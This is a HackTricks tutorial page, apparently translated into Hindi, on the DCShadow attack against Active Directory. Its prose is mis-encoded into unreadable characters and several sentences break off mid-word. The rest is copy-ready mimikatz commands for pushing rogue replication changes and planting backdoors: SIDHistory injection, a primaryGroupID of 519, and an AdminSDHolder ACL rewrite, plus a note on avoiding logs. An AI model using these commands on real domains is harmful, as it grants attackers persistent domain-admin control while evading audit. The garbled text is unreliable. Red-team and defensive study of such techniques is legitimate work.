<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдХреЛ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>


# DCShadow

рдпрд╣ AD рдореЗрдВ рдПрдХ **рдирдпрд╛ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░** рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ **рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдСрдмреНрдЬ
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - DA рдпрд╛ рд╕рдорд╛рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`elevate::token`** `mimikatz1` рд╕рддреНрд░ рдореЗрдВ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдзрд╛рдЧреЗ рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдЪреНрдЪ рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рд╣рдореЗрдВ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рдХреЛ рдЙрдЪреНрдЪ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред\
рдЖрдк рдПрдХ "LDAP" рд╡рд╕реНрддреБ рдХреЛ рднреА рдЪреБрди рд╕рдХрддреЗ рд╣реИрдВ: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

рдЖрдк DA рд╕реЗ рдпрд╛ рдЗрд╕ рдиреНрдпреВрдирддрдо рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдкрд░рд┐рд╡рд░реНрддрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* **рдбреЛрдореЗрди рд╡рд╕реНрддреБ** рдореЗрдВ:
* _DS-Install-Replica_ (рдбреЛрдореЗрди рдореЗрдВ рд░реЗрдкреНрд▓рд┐рдХрд╛ рдЬреЛрдбрд╝реЗрдВ/рд╣рдЯрд╛рдПрдВ)
* _DS-Replication-Manage-Topology_ (рд░реЗрдкреНрд▓рд┐рдХреЗрд╢рди рдЯреЛрдкреЛрд▓реЙрдЬреА рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░реЗрдВ)
* _DS-Replication-Synchronize_ (рд░реЗрдкреНрд▓рд┐рдХреЗрд╢рди рд╕рдордХрд╛рд▓реАрди)
* **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрдВрдЯреЗрдирд░** рдореЗрдВ **рд╕рд╛рдЗрдЯреНрд╕ рд╡рд╕реНрддреБ** (рдФрд░ рдЗрд╕рдХреЗ рдмрдЪреНрдЪреЗ):
* _CreateChild рдФрд░ DeleteChild_
* **рдЙрд╕ рдХрдВрдкреНрдпреВрдЯрд░ рдХреА рд╡рд╕реНрддреБ** (рдЬреЛ рдПрдХ DC рдХреЗ рд░реВрдк рдореЗрдВ рдкрдВрдЬреАрдХреГрдд рд╣реИ):
* _WriteProperty_ (рд▓реЗрдЦрди рдирд╣реАрдВ)
* **рд▓рдХреНрд╖реНрдп рд╡рд╕реНрддреБ**:
* _WriteProperty_ (рд▓реЗрдЦрди рдирд╣реАрдВ)

рдЖрдк [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдПрдХ рдЕрдиреБрдкреНрд░рдпреЛрдЧреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕рд╕реЗ рдХреБрдЫ рд▓реЙрдЧ рдЫреЛрдбрд╝ рдЬрд╛рдПрдВрдЧреЗ)ред рдпрд╣ DA рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдХрд╛рдлреА рдкреНрд░рддрд┐рдмрдВрдзрдХ рд╣реИред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЬрдм рдпреВрдЬрд░рдиреЗрдо _**student1**_ рдорд╢реАрди _**mcorp-student1**_ рдореЗрдВ рд▓реЙрдЧ рдСрди рд╣реЛрддрд╛ рд╣реИ рддреЛ рдЙрд╕рдХреЗ рдкрд╛рд╕ DCShadow рдЕрдиреБрдорддрд┐рдпрд╛рдБ _**root1user**_ рд╡рд╕реНрддреБ рдкрд░ рд╣реЛрддреА рд╣реИрдВред

## рдмреИрдХрдбреЛрд░ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП DCShadow рдХрд╛ рдЙрдкрдпреЛрдЧ
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="рдЪреЗрдЬ рдкреНрд░рд╛рдЗрдорд░реАрдЧреНрд░реБрдкрдЖрдИрдбреА (рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдбреЛрдореЗрди рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХреЛрдВ рдХреЗ рд╕рджрд╕реНрдп рдХреЗ рд░реВрдк рдореЗрдВ рдбрд╛рд▓реЗрдВ)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="AdminSDHolder рдХреЗ ntSecurityDescriptor рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ (рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг рджреЗрдВ)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## рд╢реИрдбреЛрд╕реЗрдкреНрд╢рди - DCShadow рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ DCShadow рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджреЗрдирд╛ (рд╕рдВрд╢реЛрдзрд┐рдд рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓реЙрдЧ рдирд╣реАрдВ)

рд╣рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд ACEs рдХреЛ рд╣рдорд╛рд░реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ SID рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рдирд╛ рд╣реЛрдЧрд╛:

* рдбреЛрдореЗрди рдСрдмреНрдЬ
